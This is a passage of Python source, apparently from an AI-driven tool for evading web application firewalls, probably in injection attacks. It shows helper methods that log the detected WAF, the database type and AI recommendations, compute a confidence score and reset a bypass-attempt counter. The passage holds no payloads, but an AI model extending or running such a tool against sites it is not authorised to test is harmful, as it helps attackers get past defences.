    def _build_reason(self, action: str, waf: Dict, dbms: str, ai_rec: Dict) -> str:
        """Build human-readable reason"""
        parts = [f"Action: {action}"]
        
        if waf:
            parts.append(f"WAF: {waf['waf_type']} ({waf['confidence']:.0%})")
        
        if dbms:
            parts.append(f"DBMS: {dbms}")
        
        if ai_rec:
            parts.append(f"AI: {ai_rec.get('reason', 'No explanation')[:50]}")
            parts.append(f"Provider: {ai_rec.get('provider', 'unknown')}")
        
        return " | ".join(parts)
    
    def _calculate_confidence(self, waf: Dict, ai_rec: Dict) -> float:
        """Calculate overall confidence score"""
        confidence = 0.5
        
        if waf:
            confidence += waf['confidence'] * 0.3
        
        if ai_rec:
            confidence += ai_rec.get('confidence', 0.5) * 0.2
        
        return min(1.0, confidence)
    


    def reset_bypass_attempts(self):
        # Reset bypass the attempts counter
        self.bypass_attempts = 0
        self.current_waf = None
        self.waf_confidence = 0.0


autonomous_ai = UpgradedAutonomousAI()